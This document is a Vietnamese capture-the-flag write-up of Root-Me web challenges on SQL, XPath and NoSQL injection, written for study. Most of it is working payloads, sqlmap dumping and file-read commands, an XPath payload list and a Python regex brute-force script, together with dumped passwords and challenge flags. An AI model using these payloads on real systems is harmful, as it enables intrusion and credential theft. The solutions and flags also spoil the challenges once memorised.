## 61. SQL injection - Error
- Đầu tiên phát hiện lỗi sql ở trang content vì dựa vào tham số order nên có thể đoán được hàm dùng là order by ...
- Ở đây dùng hàm Cast() để ép kiểu truyền vào là số nguyên phù hợp với order by.
- Tìm tên bảng vì có nhiều bảng nên limit 1 vào.
```js
GET /web-serveur/ch34/?action=contents&order=,CAST((select table_name from information_schema.tables limit 1) as int)-- - HTTP/1.1

ERROR:  invalid input syntax for integer: "m3mbr35t4bl3"
```
- Vì chỉ có thể hiện được một kết quả nên dùng offset (Chức năng là lấy dữ liệu bỏ qua offset đầu)
- Vì có nhiều cột nên thay đổi offset từ 1->... nhưng chỉ cần quan tâm 2 cột đầu là username và password.
```js
GET /web-serveur/ch34/?action=contents&order=,CAST((select column_name from information_schema.columns limit 1 offset 1) as int)-- - HTTP/1.1

C1: us3rn4m3_c0l
C2: p455w0rd_c0l
C3: em41l_c0l
.......
```
- Lấy username và password thôi
```js
GET /web-serveur/ch34/?action=contents&order=,CAST((select us3rn4m3_c0l from m3mbr35t4bl3 limit 1 offset 0) as int)-- - HTTP/1.1

ERROR:  invalid input syntax for integer: "admin"

GET /web-serveur/ch34/?action=contents&order=,CAST((select p455w0rd_c0l from m3mbr35t4bl3 limit 1 offset 0) as int)-- - HTTP/1.1

ERROR:  invalid input syntax for integer: "1a2BdKT5DIx3qxQN3UaC"
```
```js
Password: 1a2BdKT5DIx3qxQN3UaC
```

## 63. File - Reading
- Đầu tiên chương trình cho một form đăng nhập nhưng chỉ cần chú ý đến members vì chứa câu query tại đó
![Screenshot 2022-04-12 154239](https://i.imgur.com/3ivjrwb.png)
- Dùng sql map để dò database thì ta tìm được 3 databases một db thông tin và db test không có gì cả.
```py
sqlmap -u "http://challenge01.root-me.org/web-serveur/ch31/?action=members&id=1" --dbs
...
available databases [3]:                                                                                               
[*] c_webserveur_31
[*] information_schema
[*] test

```
- Tiếp đó là đi tìm từng table trong db c_webserveur_31 tìm được một table member
```py
sqlmap -u "http://challenge01.root-me.org/web-serveur/ch31/?action=members&id=1" -D c_webserveur_31 --tables
...
Database: c_webserveur_31
[1 table]
+--------+
| member |
+--------+
```
- Dump vào bảng member để xem thông tin thành viên
```py
sqlmap -u "http://challenge01.root-me.org/web-serveur/ch31/?action=members&id=1" -D c_webserveur_31 -T member --dump
...
Database: c_webserveur_31
Table: member
[1 entry]
+-----------+-------------------------------+--------------+----------------------------------------------------------+
| member_id | member_email                  | member_login | member_password                                          |
+-----------+-------------------------------+--------------+----------------------------------------------------------+
| 1         | admin@super-secure-webapp.org | admin        | VA5QA1cCVQgPXwEAXwZVVVsHBgtfUVBaV1QEAwIFVAJWAwBRC1tRVA== |
+-----------+-------------------------------+--------------+----------------------------------------------------------+
```
- Như vậy là đã có password của member admin nhập thử vào form nhưng bị báo là sai pass. Có một điều đặc biệt là pass có '==' ở cuối đoán là base64 và thử decode rồi điền vào form nhưng vẫn sai pass.
- Lúc này nhìn lên đề bài thì thấy yêu cầu là đọc file thì có lẽ pass sẽ được mã hóa theo một cách nào đó được viết ở trong source code.
- Đọc file source về máy thường thì file tên là index.php hoặc index.html tìm lần lượt thì có vẻ source code là index.php.
```py
sqlmap -u "http://challenge01.root-me.org/web-serveur/ch31/?action=members&id=1" --file-read /challenge/web-serveur/ch31/index.php 
...
[04:19:59] [INFO] the local file '/home/kali/.local/share/sqlmap/output/challenge01.root-me.org/files/_challenge_web-serveur_ch31_index.php' and the remote file '/challenge/web-serveur/ch31/index.php' have the same size (3359 B)            
files saved to [1]:
[*] /home/kali/.local/share/sqlmap/output/challenge01.root-me.org/files/_challenge_web-serveur_ch31_index.php (same file)

``` 
- Và đây là source code 
```php
<html>
<header><title>SQL injection - FILE</title></header>
<body>
<h3><a href="?action=login">Authentication</a>&nbsp;|&nbsp;<a href="?action=members">Members</a></h3><hr />

<?php

define('SQL_HOST',      '/var/run/mysqld/mysqld3-web-serveur-ch31.sock');
define('SQL_DB',        'c_webserveur_31');
define('SQL_LOGIN',     'c_webserveur_31');
define('SQL_P',         'dOJLsrbyas3ZdrNqnhx');

function stringxor($o1, $o2) {
    $res = '';
    for($i=0;$i<strlen($o1);$i++)
        $res .= chr(ord($o1[$i]) ^ ord($o2[$i]));        
    return $res;
}

$key = "c92fcd618967933ac463feb85ba00d5a7ae52842";
 
$GLOBALS["___mysqli_ston"] = mysqli_connect('', SQL_LOGIN, SQL_P, "", 0, SQL_HOST) or exit('mysql connection error !');
mysqli_select_db($GLOBALS["___mysqli_ston"], SQL_DB) or die("Database selection error !");

if($_GET['action'] == "login"){
        print '<form METHOD="POST">
                <p><label style="display:inline-block;width:100px;">Login : </label><input type="text" name="username" /></p>
                <p><label style="display:inline-block;width:100px;">Password : </label><input type="password" name="password" /></p>
                <p><input value=submit type=submit /></p>
                </form>';

        if(isset($_POST['username'], $_POST['password']) && !empty($_POST['username']) && !empty($_POST['password']))
        {
                $user = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], strtolower($_POST['username']));
                $pass = sha1($_POST['password']);
                
                $result = mysqli_query($GLOBALS["___mysqli_ston"], "SELECT member_password FROM member WHERE member_login='".$user."'");
                if(mysqli_num_rows($result) == 1)
                {
                        $data = mysqli_fetch_array($result);
                        if($pass == stringxor($key, base64_decode($data['member_password']))){
                                // authentication success
                                print "<p>Authentication success !!</p>";
                                if ($user == "admin")
                                    print "<p>Yeah !!! You're admin ! Use this password to complete this challenge.</p>";
                                else 
                                    print "<p>But... you're not admin !</p>";
                        }
                        else{
                                // authentication failed
                                print "<p>Authentication failed !</p>";
                        }
                }
                else{
                        print "<p>User not found !</p>";
                }
        }
}
)

if($_GET['action'] == "members"){
        if(isset($_GET['id']) && !empty($_GET['id']))
        {
                // secure ID variable
                $id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $_GET['id']);
                $result = mysqli_query($GLOBALS["___mysqli_ston"], "SELECT * FROM member WHERE member_id=$id") or die(mysqli_error($GLOBALS["___mysqli_ston"]));
                
                if(mysqli_num_rows($result) == 1)
                {
                        $data = mysqli_fetch_array($result);
                        print "ID : ".$data["member_id"]."<br />";
                        print "Username : ".$data["member_login"]."<br />";
                        print "Email : ".$data["member_email"]."<br />";        
                }
                else{
                        print "no result found";
                }
        }
        else{
                $result = mysqli_query($GLOBALS["___mysqli_ston"], "SELECT * FROM member");
                while ($row = mysqli_fetch_assoc($result)) {
                        print "<p><a href=\"?action=members&id=".$row['member_id']."\">".$row['member_login']."</a></p>";
                }
        }
}

?>
</body>
</html>
```
- Ta chỉ cần để ý 2 hàm này
```php
function stringxor($o1, $o2) {
    $res = '';
    for($i=0;$i<strlen($o1);$i++)
        $res .= chr(ord($o1[$i]) ^ ord($o2[$i]));        
    return $res;
}

$key = "c92fcd618967933ac463feb85ba00d5a7ae52842";
if($pass == stringxor($key, base64_decode($data['member_password'])))
```
- Có vẻ pass là xor từng bytes giữa member_password và $key
- Viết chương trình đơn giản để lấy pass
```php
<?php
$key = "c92fcd618967933ac463feb85ba00d5a7ae52842";
function stringxor($o1, $o2) {
    $res = '';
    for($i=0;$i<strlen($o1);$i++)
        $res .= chr(ord($o1[$i]) ^ ord($o2[$i])); 
    return $res;
}
$q = stringxor($key, base64_decode("VA5QA1cCVQgPXwEAXwZVVVsHBgtfUVBaV1QEAwIFVAJWAwBRC1tRVA=="));
echo $q;
?>

$ php test.php
77be4fc97f77f5f48308942bb6e32aacabed9cef 
```
- Và pass kia là mã hóa dạng sha1 nên decrypt là ra mật khẩu rồi submit là thành công.

![Screenshot 2022-04-12 161635](https://i.imgur.com/p7PfLyu.png)

## 64. XPath injection - String
- Đầu tiên thì họ cho cái form để search thành viên.
- Đây là theo kiểu string xpath nên có thể injection được.
- Thường thì cấu trúc search nó sẽ như thế này.
```js
/user/username[contains(., '+VALUE+')]
```
- Có thể đọc tìm hiểu tại:
https://book.hacktricks.xyz/pentesting-web/xpath-injection#:~:text=XPath%20Injection%20is%20an%20attack,query%20or%20navigate%20XML%20documents.
- Một số payload về string:
```js
') or 1=1 or (' #Get all names
') or 1=1] | //user/password[('')=(' #Get all names and passwords
') or 2=1] | //user/node()[('')=(' #Get all values
')] | //./node()[('')=(' #Get all values
')] | //node()[('')=(' #Get all values
') or 1=1] | //user/password[('')=(' #Get all names and passwords
')] | //password%00 #All names and passwords (abusing null injection)
')]/../*[3][text()!=(' #All the passwords
')] | //user/*[1] | a[(' #The ID of all users
')] | //user/*[2] | a[(' #The name of all users
')] | //user/*[3] | a[(' #The password of all users
')] | //user/*[4] | a[(' #The account of all users
```
- Ở đây dùng get all values 
```js
') or 2=1] | //user/node()[('')=('

2
Harry
MB5PRCvfOXiYejMcmNTI => Flag
administrator
Harry@admin.org
```

## 65. NoSQL injection - Blind
- Đề yêu cầu bản demo của nosqlblind
- Vì đầy là blind nên dùng [regex] để tìm kiếm flag chuẩn dựa vào bruteforce.
- Input đầu vào với 2 param là chall_name và flag.
- Check từng ký tự xem flag và khi check đúng sẽ nhận được mes "Yeah this is the flag for nosqlblind!"
- Tool tìm flag
```py
import urllib
import requests
import tqdm
import string
url = 'http://challenge01.root-me.org/web-serveur/ch48/index.php'

list_char = string.digits + string.ascii_letters + '\\'.join(list('!@#$%^&*()_+{}:"<>?-=[];\',./'))

pad = ''
flags = ''
flag_find = 0
while True:
    for x in list_char:
        if x == '\\':
            pad = '\\'
            continue
        x = pad+x
        pad = ''
        payload = '^' + flags + x +'.*' #Truy vấn các chuỗi bắt đầu từ '^flag' và kết thúc là '*'
        print('payload : ' + payload)
        params = {'chall_name' : 'nosqlblind', 'flag[$regex]' : payload}
        res = requests.get(url, params = params)
        if res.text.find('Yeah') != -1:
            flags += x.replace('\\', '')
            flag_find = 1
            break
    if flag_find != 1:
        break
    flag_find = 0

print ('flag: ' + flags)

```
```js
flag: 3@sY_n0_5q7_1nj3c710n
```

## 69. 	SQL injection - Blind
- Đầu tiên cho 1 form đăng nhập input thì vẫn thử như bình thường 
```js
username=admin'or 1=1--
```
- Thì đăng nhập thành công nhưng không thông báo gì cả.
- Cần phải lấy password thì trước tiên kiểm tra độ dài password đã
```js
username=admin'+and+(select+length(password)+from+users+where+(username='admin'))=8--&password=aa
=> Thành công
```
- Bruteforce password
```js
username=admin'+and+substr((select+password+from+users+where+(username='admin')),§1§,1)='§a§'--&password=aa

Payload1: 123456789
Payload2: 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+{}:"<>?-=[];',./
```
![Screenshot 2022-05-27 135149](https://i.imgur.com/jmrdZT8.png)
- Ngồi đợi một lúc là ra
```js
Flag: e2azO93i
```
## 70. SQL injection - Time based
- Time-based – Hacker sẽ gửi một truy vấn SQL đến Cơ sở dữ liệu, làm cho Cơ sở dữ liệu đợi (trong vài giây) trước khi có thể hoạt động. Sau đó, hacker có thể xem từ thời gian Cơ sở dữ liệu cần để phản hồi, một truy vấn là đúng hay sai. Dựa trên kết quả, một HTTP repsonse sẽ được tạo ra. Vì vậy hacker có thể tìm ra thông báo mà chúng đã sử dụng trả về đúng hay sai, không cần dựa vào dữ liệu từ Cơ sở dữ liệu.
- Đầu tiên thực hiện câu truy vấn có thì kết quả trả về 3000ms nên khai thác được.
![Screenshot 2022-05-27 150440](https://i.imgur.com/2ZRYpTo.png)
- Tìm length và tên của dbs 
```js
action=member&member=1;select+case+when+(select+length(table_name)+from+information.schema.tables+limit+1)=5+then+pg_sleep(5)+else+pg_sleep(0)+end--

action=member&member=1;select+case+when+(select+length(column_name)+from+information.schema.columns+limit+1+offset+5)=8+then+pg_sleep(5)+else+pg_sleep(0)+end--
```
- Xong như sqli blind tìm length và password của user nhưng dò hơi lâu nên dùng luôn sqlmap. Lưu request vào file test.txt
```js

```
```js
python3 sqlmap.py -r test.txt --tables

Database: public
[1 table]
+-------+
| users |
+-------+
```
- Chọn time-sec = 3
```js
~/sqlmap# python3 sqlmap.py -r test.txt --time-sec=3 -T users --column

Database: public
Table: users
[6 columns]
+-----------+---------+
| Column    | Type    |
+-----------+---------+
| email     | varchar |
| firstname | varchar |
| id        | int4    |
| lastname  | varchar |
| password  | varchar |
| username  | varchar |
+-----------+---------+
```
- Đọc username và password là xong
```js
:~/sqlmap# python3 sqlmap.py -r test.txt --time-sec=3 -D public -T users  -C username,password --dum
p

Database: public
Table: users
[3 entries]
+----------+---------------+
| username | password      |
+----------+---------------+
| jsilver  | J0hNG0lDeN    |
| jsparow  | Sp@r0WKr@K3n  |
| admin    | T!m3B@s3DSQL! |
+----------+---------------+
```
## 73. XPath injection - Blind